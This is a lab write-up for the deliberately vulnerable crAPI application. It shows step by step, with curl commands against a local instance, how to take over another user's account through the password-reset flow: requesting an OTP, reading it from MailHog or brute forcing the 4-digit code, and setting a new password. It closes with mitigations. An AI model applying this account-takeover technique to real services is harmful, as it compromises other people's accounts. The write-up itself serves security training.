# Challenge 3 — Broken User Authentication: Reset another user's password

**OWASP API Top 10 mapping:** API2:2023 Broken Authentication  
**crAPI category:** Broken User Authentication

## Goal

Take over another crAPI account by resetting its password without knowing the original password.

## Vulnerability

crAPI's password reset flow uses a short, numeric OTP sent by email. The OTP endpoint for validation (`/identity/api/auth/v2/check-otp`) does **not** rate-limit or lock out after failed attempts, and a 4-digit code is trivial to brute force. In this lab, outbound email is captured by MailHog, so the attacker can also read the OTP directly.

## Exploit steps

### 1. Identify a target account

crAPI seeds several test accounts. We used `test@example.com`.

### 2. Request a password-reset OTP for the target

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'
```

Expected response:

```json
{
  "message": "OTP Sent on the provided email, test@example.com",
  "status": 200
}
```

### 3. Read the OTP from MailHog (or brute force it)

Because all email is routed to the local MailHog container, the OTP is visible at the MailHog API:

```bash
curl -s http://127.0.0.1:8025/api/v2/messages | python3 -m json.tool
```

Look for the `crAPI OTP` message. The raw body contains:

```html
Your one time generated otp is: 5541
```

> The OTP is only **4 digits**, and `v2/check-otp` allows unlimited guesses. A simple brute-force script can try `0000`–`9999` without lockout.

### 4. Validate the OTP and set a new password

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/auth/v2/check-otp \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "otp": "5541",
    "password": "Hacked!123"
  }'
```

Expected response:

```json
{
  "message": "OTP verified",
  "status": 200
}
```

The original password is now overwritten. We successfully reset another user's password.

### 5. Log in with the new password

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "Hacked!123"
  }'
```

The response returns a valid JWT for `test@example.com`.

## Why this works

- The OTP is only 4 numeric digits (10,000 possible values).
- `/identity/api/auth/v2/check-otp` does not enforce a maximum number of attempts.
- A "secure" version exists at `/identity/api/auth/v3/check-otp`, but the predictable `v2` path remains exposed.
- MailHog is accessible on the local network, so the reset token is effectively public in this lab configuration.

## Mitigation

- Increase OTP entropy: use at least 6–8 alphanumeric characters or longer numeric codes.
- Rate-limit or lock out the OTP validation endpoint after a small number of failed attempts.
- Expire OTPs quickly (e.g., 5 minutes) and invalidate them after a successful use.
- Do not expose multiple versions of the same sensitive endpoint (`v2` insecure, `v3` secure); remove the weak path.
- Send reset tokens to verified, out-of-band channels and never rely on local-only mail capture in production.
- Consider using signed, single-use reset links instead of short OTPs.
